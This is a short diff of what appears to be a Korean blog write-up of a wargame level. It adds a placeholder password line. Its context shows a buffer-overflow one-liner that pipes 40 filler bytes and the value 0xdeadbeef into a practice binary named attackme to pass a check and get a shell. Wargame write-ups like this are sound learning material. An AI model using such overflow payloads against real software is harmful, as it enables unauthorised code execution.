@@ -47,6 +47,7 @@ int check // 16-12</code></pre></div>
 <p>따라서 40바이트의 \x90과 4바이트의 int의 값을 맞춰주면 된다. 1 바이트나 여유가 남는다(!)</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">@BufferOverflow :
 (python -c 'print "A"*40+"\xef\xbe\xad\xde"'; cat) | ./attackme</code></pre></div>
+<p>비밀번호 : guess what</p>
 <p>문제가 조금씩 어려워지고 있다. 얼른 Level20까지 끝냈으면…</p>
 <hr>
 <h2>Source</h2>
